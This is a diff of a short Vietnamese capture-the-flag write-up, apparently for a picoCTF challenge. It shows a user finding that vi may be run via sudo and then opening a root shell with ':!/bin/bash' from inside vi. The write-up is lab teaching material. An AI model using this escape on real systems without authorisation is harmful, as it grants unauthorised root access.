@@ -4,6 +4,7 @@
 
 Đăng nhập sever ssh theo địa chỉ và mật khẩu đề bài đưa<br>
 Kiểm tra sudo permissions xem user có quyền truy cập đến đâu bằng lệnh sau <br>
+```sudo -l```
 ```
 picoplayer@challenge:~$ whoami
 picoplayer
@@ -16,7 +17,7 @@ User picoplayer may run the following commands on challenge:
     (ALL) /usr/bin/vi
 ```
 Ta có quyền truy cập tới vi text editor -> có thể dùng vi như là root cho mọi file<br>
-Tạo file (test) trong thư mục với vi: ```sudo vi test```
+Tạo file (test) trong thư mục với vi: ```sudo vi test```.
 Chạy câu lệnh [này](https://gtfobins.github.io/) sau khi ở trong command mode của vi: ```:!/bin/bash```<br>
 
 ![alt text](image-1.png)
